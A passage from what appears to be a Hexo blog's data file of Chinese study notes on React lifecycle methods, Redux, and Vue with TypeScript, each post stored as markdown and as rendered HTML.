改变时 触发)\n````\ncomponentWillReceiveProps(nextProps) {\n  <!-- 当组件可能接收到`新道具`时调用。即使道具没有改变，你也可以这样称呼它，所以如果你只想处理改变，一定要比较新的和现有的道具。 -->\n  <!-- 调用组件setstate通常不会触发这种方法。 -->\n}\nshouldComponentUpdate(nextProps, nextState) \ncomponentWillUpdata() {\n  <!-- willUpdata 下 设置 setState 会触发 componentReceiveProps -->\n}\n+ render()\ncomponentDidUpdata\n````\n\n**组件销毁:**\n````\ncomponentDis\n````\n\n## 单向数据流\n被动接收 => 数据流逻辑\n\n## 无状态组件如何避免`重绘(reflow)`/`重排版(repaint)`\n\n## React 路由跳转\n````\n  this.props.history.push('/login')\n````\n\n## React.Children.map渲染对象\n````\n{\n    React.Children.map(children, (child) => {\n        return <Fragment>{child}</Fragment>\n    })\n}\n````\n\n## React-router 去掉url上的#\n````\nimport {browserHistory} from 'react-router'\n<Router history={browserHistory}>\n...\n</Router>\n````\n\n","slug":"FrontEnd/WebFrameWork/React/React学习笔记","published":1,"updated":"2018-11-29T09:13:24.243Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry2800drzodvy7sfo7qv","content":"<h2 id=\"第一步-实现功能模块\"><a href=\"#第一步-实现功能模块\" class=\"headerlink\" title=\"第一步 实现功能模块\"></a>第一步 实现功能模块</h2><ol>\n<li>npm install antd –save-dev</li>\n<li>import ‘antd css style sheets’</li>\n<li>创建 模板</li>\n<li>import {Menu, Table, Pagination} from ‘antd’;</li>\n<li>导出模板到 ./index.js</li>\n<li>Router 注册； Nav 里面 添加 路由 link<br>Compelite</li>\n</ol>\n<h2 id=\"四大部分-props-state-lifecircle-context\"><a href=\"#四大部分-props-state-lifecircle-context\" class=\"headerlink\" title=\"四大部分(props state lifecircle context)\"></a>四大部分(<code>props</code> <code>state</code> <code>lifecircle</code> <code>context</code>)</h2><h2 id=\"组件构建三种方法\"><a href=\"#组件构建三种方法\" class=\"headerlink\" title=\"组件构建三种方法\"></a>组件构建三种方法</h2><p>① React.createClass<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const Button = React.createClass(&#123;</span><br><span class=\"line\">  // method/lifecircle</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure></p>\n<p>② ES6class</p>\n<p>③ 无状态函数<br>无状态组件只传入<code>props</code>和<code>context</code>,不存在<code>state</code>.<br><code>propsTyps</code>和<code>defaultProps</code> 可通过 向 方法 设置 静态属性</p>\n<h2 id=\"组件五种形式\"><a href=\"#组件五种形式\" class=\"headerlink\" title=\"组件五种形式\"></a>组件五种形式</h2><p>[<code>容器</code>, <code>业务逻辑</code>, <code>取数据</code>, <code>布局(layout)</code>, <code>无状态组件</code>]</p>\n<h2 id=\"生命周期-lifecircle\"><a href=\"#生命周期-lifecircle\" class=\"headerlink\" title=\"生命周期(lifecircle)\"></a>生命周期(lifecircle)</h2><p><a href=\"https://segmentfault.com/a/1190000004168886\" target=\"_blank\" rel=\"noopener\">参考文档</a><br><strong>初始化:</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">constructor</span><br><span class=\"line\">componentWillMount</span><br><span class=\"line\">+ render()</span><br><span class=\"line\">componentDidMount</span><br></pre></td></tr></table></figure></p>\n<p><strong>周期改变:</strong>(<code>props/state</code> 改变时 触发)<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">componentWillReceiveProps(nextProps) &#123;</span><br><span class=\"line\">  &lt;!-- 当组件可能接收到`新道具`时调用。即使道具没有改变，你也可以这样称呼它，所以如果你只想处理改变，一定要比较新的和现有的道具。 --&gt;</span><br><span class=\"line\">  &lt;!-- 调用组件setstate通常不会触发这种方法。 --&gt;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">shouldComponentUpdate(nextProps, nextState) </span><br><span class=\"line\">componentWillUpdata() &#123;</span><br><span class=\"line\">  &lt;!-- willUpdata 下 设置 setState 会触发 componentReceiveProps --&gt;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">+ render()</span><br><span class=\"line\">componentDidUpdata</span><br></pre></td></tr></table></figure></p>\n<p><strong>组件销毁:</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">componentDis</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"单向数据流\"><a href=\"#单向数据流\" class=\"headerlink\" title=\"单向数据流\"></a>单向数据流</h2><p>被动接收 =&gt; 数据流逻辑</p>\n<h2 id=\"无状态组件如何避免重绘-reflow-重排版-repaint\"><a href=\"#无状态组件如何避免重绘-reflow-重排版-repaint\" class=\"headerlink\" title=\"无状态组件如何避免重绘(reflow)/重排版(repaint)\"></a>无状态组件如何避免<code>重绘(reflow)</code>/<code>重排版(repaint)</code></h2><h2 id=\"React-路由跳转\"><a href=\"#React-路由跳转\" class=\"headerlink\" title=\"React 路由跳转\"></a>React 路由跳转</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">this.props.history.push(&apos;/login&apos;)</span><br></pre></td></tr></table></figure>\n<h2 id=\"React-Children-map渲染对象\"><a href=\"#React-Children-map渲染对象\" class=\"headerlink\" title=\"React.Children.map渲染对象\"></a>React.Children.map渲染对象</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    React.Children.map(children, (child) =&gt; &#123;</span><br><span class=\"line\">        return &lt;Fragment&gt;&#123;child&#125;&lt;/Fragment&gt;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"React-router-去掉url上的\"><a href=\"#React-router-去掉url上的\" class=\"headerlink\" title=\"React-router 去掉url上的\"></a>React-router 去掉url上的</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import &#123;browserHistory&#125; from &apos;react-router&apos;</span><br><span class=\"line\">&lt;Router history=&#123;browserHistory&#125;&gt;</span><br><span class=\"line\">...</span><br><span class=\"line\">&lt;/Router&gt;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"第一步-实现功能模块\"><a href=\"#第一步-实现功能模块\" class=\"headerlink\" title=\"第一步 实现功能模块\"></a>第一步 实现功能模块</h2><ol>\n<li>npm install antd –save-dev</li>\n<li>import ‘antd css style sheets’</li>\n<li>创建 模板</li>\n<li>import {Menu, Table, Pagination} from ‘antd’;</li>\n<li>导出模板到 ./index.js</li>\n<li>Router 注册； Nav 里面 添加 路由 link<br>Compelite</li>\n</ol>\n<h2 id=\"四大部分-props-state-lifecircle-context\"><a href=\"#四大部分-props-state-lifecircle-context\" class=\"headerlink\" title=\"四大部分(props state lifecircle context)\"></a>四大部分(<code>props</code> <code>state</code> <code>lifecircle</code> <code>context</code>)</h2><h2 id=\"组件构建三种方法\"><a href=\"#组件构建三种方法\" class=\"headerlink\" title=\"组件构建三种方法\"></a>组件构建三种方法</h2><p>① React.createClass<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const Button = React.createClass(&#123;</span><br><span class=\"line\">  // method/lifecircle</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure></p>\n<p>② ES6class</p>\n<p>③ 无状态函数<br>无状态组件只传入<code>props</code>和<code>context</code>,不存在<code>state</code>.<br><code>propsTyps</code>和<code>defaultProps</code> 可通过 向 方法 设置 静态属性</p>\n<h2 id=\"组件五种形式\"><a href=\"#组件五种形式\" class=\"headerlink\" title=\"组件五种形式\"></a>组件五种形式</h2><p>[<code>容器</code>, <code>业务逻辑</code>, <code>取数据</code>, <code>布局(layout)</code>, <code>无状态组件</code>]</p>\n<h2 id=\"生命周期-lifecircle\"><a href=\"#生命周期-lifecircle\" class=\"headerlink\" title=\"生命周期(lifecircle)\"></a>生命周期(lifecircle)</h2><p><a href=\"https://segmentfault.com/a/1190000004168886\" target=\"_blank\" rel=\"noopener\">参考文档</a><br><strong>初始化:</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">constructor</span><br><span class=\"line\">componentWillMount</span><br><span class=\"line\">+ render()</span><br><span class=\"line\">componentDidMount</span><br></pre></td></tr></table></figure></p>\n<p><strong>周期改变:</strong>(<code>props/state</code> 改变时 触发)<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">componentWillReceiveProps(nextProps) &#123;</span><br><span class=\"line\">  &lt;!-- 当组件可能接收到`新道具`时调用。即使道具没有改变，你也可以这样称呼它，所以如果你只想处理改变，一定要比较新的和现有的道具。 --&gt;</span><br><span class=\"line\">  &lt;!-- 调用组件setstate通常不会触发这种方法。 --&gt;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">shouldComponentUpdate(nextProps, nextState) </span><br><span class=\"line\">componentWillUpdata() &#123;</span><br><span class=\"line\">  &lt;!-- willUpdata 下 设置 setState 会触发 componentReceiveProps --&gt;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">+ render()</span><br><span class=\"line\">componentDidUpdata</span><br></pre></td></tr></table></figure></p>\n<p><strong>组件销毁:</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">componentDis</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"单向数据流\"><a href=\"#单向数据流\" class=\"headerlink\" title=\"单向数据流\"></a>单向数据流</h2><p>被动接收 =&gt; 数据流逻辑</p>\n<h2 id=\"无状态组件如何避免重绘-reflow-重排版-repaint\"><a href=\"#无状态组件如何避免重绘-reflow-重排版-repaint\" class=\"headerlink\" title=\"无状态组件如何避免重绘(reflow)/重排版(repaint)\"></a>无状态组件如何避免<code>重绘(reflow)</code>/<code>重排版(repaint)</code></h2><h2 id=\"React-路由跳转\"><a href=\"#React-路由跳转\" class=\"headerlink\" title=\"React 路由跳转\"></a>React 路由跳转</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">this.props.history.push(&apos;/login&apos;)</span><br></pre></td></tr></table></figure>\n<h2 id=\"React-Children-map渲染对象\"><a href=\"#React-Children-map渲染对象\" class=\"headerlink\" title=\"React.Children.map渲染对象\"></a>React.Children.map渲染对象</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    React.Children.map(children, (child) =&gt; &#123;</span><br><span class=\"line\">        return &lt;Fragment&gt;&#123;child&#125;&lt;/Fragment&gt;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"React-router-去掉url上的\"><a href=\"#React-router-去掉url上的\" class=\"headerlink\" title=\"React-router 去掉url上的\"></a>React-router 去掉url上的</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import &#123;browserHistory&#125; from &apos;react-router&apos;</span><br><span class=\"line\">&lt;Router history=&#123;browserHistory&#125;&gt;</span><br><span class=\"line\">...</span><br><span class=\"line\">&lt;/Router&gt;</span><br></pre></td></tr></table></figure>\n"},{"title":"Redux学习笔记","date":"2018-09-05T08:44:43.000Z","_content":"## dispatch\n````\nfunction (action) {\n  if (sagaMonitor && sagaMonitor.actionDispatched) {\n    sagaMonitor.actionDispatched(action);\n  }\n  var result = next(action); // hit reducers\n  sagaEmitter.emit(action);\n  return result;\n};\n````\n\n## 项目中学习Redux\n记录在脚手架学习Demo中尝试使用Redux的过程。\n\n1. \n2. 定义\n3. Action中创建`AppRedux`文件夹, 创建`action.AppRedux.type.js` \\\n内容如下：\n> export const APP_REDUX = \"APP_REDUX\";\n4. 在`Action`文件夹下`index`中引入 需要抛出的变量\n> import {APP_REDUX} from './AppRedux/action.appRedux.type';\n5. 定义 一个 `Reducer` `APP_REDUX`, 并引入 action 变量 type\n6. 每次程序 dispatch 一个 action，所有 reducer 都会在当前reducer中通过 switch 语句 判断 action 是否 触发本状态\n7.\n````\nimport { combineReducers } from 'redux';\n\n// 所有 reducer 通过 `combineReducers({...Reducers})`方法 \n````\n\n\n","source":"_posts/FrontEnd/WebFrameWork/React/Redux学习笔记.md","raw":"---\ntitle: Redux学习笔记\ndate: 2018-09-05 16:44:43\ntags: Redux\ncategories: Redux\n---\n## dispatch\n````\nfunction (action) {\n  if (sagaMonitor && sagaMonitor.actionDispatched) {\n    sagaMonitor.actionDispatched(action);\n  }\n  var result = next(action); // hit reducers\n  sagaEmitter.emit(action);\n  return result;\n};\n````\n\n## 项目中学习Redux\n记录在脚手架学习Demo中尝试使用Redux的过程。\n\n1. \n2. 定义\n3. Action中创建`AppRedux`文件夹, 创建`action.AppRedux.type.js` \\\n内容如下：\n> export const APP_REDUX = \"APP_REDUX\";\n4. 在`Action`文件夹下`index`中引入 需要抛出的变量\n> import {APP_REDUX} from './AppRedux/action.appRedux.type';\n5. 定义 一个 `Reducer` `APP_REDUX`, 并引入 action 变量 type\n6. 每次程序 dispatch 一个 action，所有 reducer 都会在当前reducer中通过 switch 语句 判断 action 是否 触发本状态\n7.\n````\nimport { combineReducers } from 'redux';\n\n// 所有 reducer 通过 `combineReducers({...Reducers})`方法 \n````\n\n\n","slug":"FrontEnd/WebFrameWork/React/Redux学习笔记","published":1,"updated":"2018-10-07T08:15:13.611Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry2900duzodv7amoajip","content":"<h2 id=\"dispatch\"><a href=\"#dispatch\" class=\"headerlink\" title=\"dispatch\"></a>dispatch</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function (action) &#123;</span><br><span class=\"line\">  if (sagaMonitor &amp;&amp; sagaMonitor.actionDispatched) &#123;</span><br><span class=\"line\">    sagaMonitor.actionDispatched(action);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  var result = next(action); // hit reducers</span><br><span class=\"line\">  sagaEmitter.emit(action);</span><br><span class=\"line\">  return result;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"项目中学习Redux\"><a href=\"#项目中学习Redux\" class=\"headerlink\" title=\"项目中学习Redux\"></a>项目中学习Redux</h2><p>记录在脚手架学习Demo中尝试使用Redux的过程。</p>\n<ol>\n<li></li>\n<li>定义</li>\n<li>Action中创建<code>AppRedux</code>文件夹, 创建<code>action.AppRedux.type.js</code> \\<br>内容如下：<blockquote>\n<p>export const APP_REDUX = “APP_REDUX”;</p>\n</blockquote>\n</li>\n<li>在<code>Action</code>文件夹下<code>index</code>中引入 需要抛出的变量<blockquote>\n<p>import {APP_REDUX} from ‘./AppRedux/action.appRedux.type’;</p>\n</blockquote>\n</li>\n<li>定义 一个 <code>Reducer</code> <code>APP_REDUX</code>, 并引入 action 变量 type</li>\n<li>每次程序 dispatch 一个 action，所有 reducer 都会在当前reducer中通过 switch 语句 判断 action 是否 触发本状态<br>7.<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import &#123; combineReducers &#125; from &apos;redux&apos;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 所有 reducer 通过 `combineReducers(&#123;...Reducers&#125;)`方法</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"dispatch\"><a href=\"#dispatch\" class=\"headerlink\" title=\"dispatch\"></a>dispatch</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function (action) &#123;</span><br><span class=\"line\">  if (sagaMonitor &amp;&amp; sagaMonitor.actionDispatched) &#123;</span><br><span class=\"line\">    sagaMonitor.actionDispatched(action);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  var result = next(action); // hit reducers</span><br><span class=\"line\">  sagaEmitter.emit(action);</span><br><span class=\"line\">  return result;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"项目中学习Redux\"><a href=\"#项目中学习Redux\" class=\"headerlink\" title=\"项目中学习Redux\"></a>项目中学习Redux</h2><p>记录在脚手架学习Demo中尝试使用Redux的过程。</p>\n<ol>\n<li></li>\n<li>定义</li>\n<li>Action中创建<code>AppRedux</code>文件夹, 创建<code>action.AppRedux.type.js</code> \\<br>内容如下：<blockquote>\n<p>export const APP_REDUX = “APP_REDUX”;</p>\n</blockquote>\n</li>\n<li>在<code>Action</code>文件夹下<code>index</code>中引入 需要抛出的变量<blockquote>\n<p>import {APP_REDUX} from ‘./AppRedux/action.appRedux.type’;</p>\n</blockquote>\n</li>\n<li>定义 一个 <code>Reducer</code> <code>APP_REDUX</code>, 并引入 action 变量 type</li>\n<li>每次程序 dispatch 一个 action，所有 reducer 都会在当前reducer中通过 switch 语句 判断 action 是否 触发本状态<br>7.<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import &#123; combineReducers &#125; from &apos;redux&apos;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 所有 reducer 通过 `combineReducers(&#123;...Reducers&#125;)`方法</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n"},{"title":"TS-VUE-Watch属性","date":"2018-05-24T10:23:12.000Z","_content":"## vue的Watch在tsx中用法\n### [转：vue + typescript 项目起手式](https://segmentfault.com/a/1190000011744210)\n\n[vue-property-decorator:官方文档](https://github.com/kaorun343/vue-property-decorator)\n````\nimport { Component, Prop, Provide, Watch } from 'vue-property-decorator'\n\n@Watch('$route', { immediate: true, deep: true })\non$routeChanged(val: any, oldVal: any) {\n        this.cardList()\n}\n````","source":"_posts/FrontEnd/WebFrameWork/Vue/TS-VUE-Watch属性.md","raw":"---\ntitle: TS-VUE-Watch属性\ndate: 2018-05-24 18:23:12\ntags: TSX-Watch\ncategories: TSX-VUE-Watch\n---\n## vue的Watch在tsx中用法\n### [转：vue + typescript 项目起手式](https://segmentfault.com/a/1190000011744210)\n\n[vue-property-decorator:官方文档](https://github.com/kaorun343/vue-property-decorator)\n````\nimport { Component, Prop, Provide, Watch } from 'vue-property-decorator'\n\n@Watch('$route', { immediate: true, deep: true })\non$routeChanged(val: any, oldVal: any) {\n        this.cardList()\n}\n````","slug":"FrontEnd/WebFrameWork/Vue/TS-VUE-Watch属性","published":1,"updated":"2018-09-05T06:33:18.480Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry2b00dwzodv63oawvuo","content":"<h2 id=\"vue的Watch在tsx中用法\"><a href=\"#vue的Watch在tsx中用法\" class=\"headerlink\" title=\"vue的Watch在tsx中用法\"></a>vue的Watch在tsx中用法</h2><h3 id=\"转：vue-typescript-项目起手式\"><a href=\"#转：vue-typescript-项目起手式\" class=\"headerlink\" title=\"转：vue + typescript 项目起手式\"></a><a href=\"https://segmentfault.com/a/1190000011744210\" target=\"_blank\" rel=\"noopener\">转：vue + typescript 项目起手式</a></h3><p><a href=\"https://github.com/kaorun343/vue-property-decorator\" target=\"_blank\" rel=\"noopener\">vue-property-decorator:官方文档</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import &#123; Component, Prop, Provide, Watch &#125; from &apos;vue-property-decorator&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">@Watch(&apos;$route&apos;, &#123; immediate: true, deep: true &#125;)</span><br><span class=\"line\">on$routeChanged(val: any, oldVal: any) &#123;</span><br><span class=\"line\">        this.cardList()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"vue的Watch在tsx中用法\"><a href=\"#vue的Watch在tsx中用法\" class=\"headerlink\" title=\"vue的Watch在tsx中用法\"></a>vue的Watch在tsx中用法</h2><h3 id=\"转：vue-typescript-项目起手式\"><a href=\"#转：vue-typescript-项目起手式\" class=\"headerlink\" title=\"转：vue + typescript 项目起手式\"></a><a href=\"https://segmentfault.com/a/1190000011744210\" target=\"_blank\" rel=\"noopener\">转：vue + typescript 项目起手式</a></h3><p><a href=\"https://github.com/kaorun343/vue-property-decorator\" target=\"_blank\" rel=\"noopener\">vue-property-decorator:官方文档</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import &#123; Component, Prop, Provide, Watch &#125; from &apos;vue-property-decorator&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">@Watch(&apos;$route&apos;, &#123; immediate: true, deep: true &#125;)</span><br><span class=\"line\">on$routeChanged(val: any, oldVal: any) &#123;</span><br><span class=\"line\">        this.cardList()</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"react中{if-else}","date":"2018-05-14T02:09:30.000Z","_content":"## \n在react中用jsx渲染dom的时候经常会遇到if条件判断，然而在jsx中竟是不允许if条件判断的。以下有几种判断方式，可以根据自己的应用场景，挑选适合的。\n\n-----------------------------\n\n[阅读原文](https://blog.csdn.net/wmzy1067111110/article/details/51538241)","source":"_posts/FrontEnd/WebFrameWork/React/react中{if-else}.md","raw":"---\ntitle: react中{if-else}\ndate: 2018-05-14 10:09:30\ntags: react-if-else\ncategories: react\n---\n## \n在react中用jsx渲染dom的时候经常会遇到if条件判断，然而在jsx中竟是不允许if条件判断的。以下有几种判断方式，可以根据自己的应用场景，挑选适合的。\n\n-----------------------------\n\n[阅读原文](https://blog.csdn.net/wmzy1067111110/article/details/51538241)","slug":"FrontEnd/WebFrameWork/React/react中{if-else}","published":1,"updated":"2018-09-05T06:33:18.480Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry2c00dyzodv8sm2y199","content":"<p>##<br>在react中用jsx渲染dom的时候经常会遇到if条件判断，然而在jsx中竟是不允许if条件判断的。以下有几种判断方式，可以根据自己的应用场景，挑选适合的。</p>\n<hr>\n<p><a href=\"https://blog.csdn.net/wmzy1067111110/article/details/51538241\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>##<br>在react中用jsx渲染dom的时候经常会遇到if条件判断，然而在jsx中竟是不允许if条件判断的。以下有几种判断方式，可以根据自己的应用场景，挑选适合的。</p>\n<hr>\n<p><a href=\"https://blog.csdn.net/wmzy1067111110/article/details/51538241\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"VUE获取当前路由的API","date":"2018-05-24T06:58:37.000Z","_content":"## TS语法\n````\nlet curPath = (this.$router as any).history.current.path\n````\n\n## Vue模板语法\n````\nlet curPath = this.$router.history.current.path\n\n````","source":"_posts/FrontEnd/WebFrameWork/Vue/VUE获取当前路由的API.md","raw":"---\ntitle: VUE获取当前路由的API\ndate: 2018-05-24 14:58:37\ntags: 获取当前路由地址\ncategories: VUE\n---\n## TS语法\n````\nlet curPath = (this.$router as any).history.current.path\n````\n\n## Vue模板语法\n````\nlet curPath = this.$router.history.current.path\n\n````","slug":"FrontEnd/WebFrameWork/Vue/VUE获取当前路由的API","published":1,"updated":"2018-09-05T06:33:18.480Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry2e00e2zodvsd42rw6a","content":"<h2 id=\"TS语法\"><a href=\"#TS语法\" class=\"headerlink\" title=\"TS语法\"></a>TS语法</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let curPath = (this.$router as any).history.current.path</span><br></pre></td></tr></table></figure>\n<h2 id=\"Vue模板语法\"><a href=\"#Vue模板语法\" class=\"headerlink\" title=\"Vue模板语法\"></a>Vue模板语法</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let curPath = this.$router.history.current.path</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"TS语法\"><a href=\"#TS语法\" class=\"headerlink\" title=\"TS语法\"></a>TS语法</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let curPath = (this.$router as any).history.current.path</span><br></pre></td></tr></table></figure>\n<h2 id=\"Vue模板语法\"><a href=\"#Vue模板语法\" class=\"headerlink\" title=\"Vue模板语法\"></a>Vue模板语法</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let curPath = this.$router.history.current.path</span><br></pre></td></tr></table></figure>"},{"title":"Vtsx判断绑定多class名","date":"2018-06-04T03:18:10.000Z","_content":"### vtsx绑定多类名表达式\n````\nclass={(this.listNum === i + 1 ? `showdd${i}` : '') + \" \" + \"show\"}\n\n````","source":"_posts/FrontEnd/WebFrameWork/Vue/Vtsx判断绑定多class名.md","raw":"---\ntitle: Vtsx判断绑定多class名\ndate: 2018-06-04 11:18:10\ntags: vtsx多类名\ncategories: Vtsx\n---\n### vtsx绑定多类名表达式\n````\nclass={(this.listNum === i + 1 ? `showdd${i}` : '') + \" \" + \"show\"}\n\n````","slug":"FrontEnd/WebFrameWork/Vue/Vtsx判断绑定多class名","published":1,"updated":"2018-09-05T06:33:18.480Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsfmry2g00e4zodvxxxcuehg","content":"<h3 id=\"vtsx绑定多类名表达式\"><a href=\"#vtsx绑定多类名表达式\" class=\"headerlink\" title=\"vtsx绑定多类名表达式\"></a>vtsx绑定多类名表达式</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class=&#123;(this.listNum === i + 1 ? `showdd$&#123;i&#125;` : &apos;&apos;) + &quot; &quot; + &quot;show&quot;&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"vtsx绑定多类名表达式\"><a href=\"#vtsx绑定多类名表达式\" class=\"headerlink\" title=\"vtsx绑定多类名表达式\"></a>vtsx绑定多类名表达式</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class=&#123;(this.listNum === i + 1 ? `showdd$&#123;i&#125;` : &apos;&apos;) + &quot; &quot; + &quot;show&quot;&#125;</span><br></pre></td></tr></table></figure>"},{"title":"Vue-$nextTick()作用","date":"2018-07-14T01:44:23.000Z","_content":"## [Vue中`$nextTick()`作用](https://blog.csdn.net/shuidinaozhongyan/article/details/72630573)\n\n官方文档解释如下：\n\n在下次 DOM `更新循环结束之后`执行延迟回调。在修改数据之后立即使用这个方法，获取`更新后的 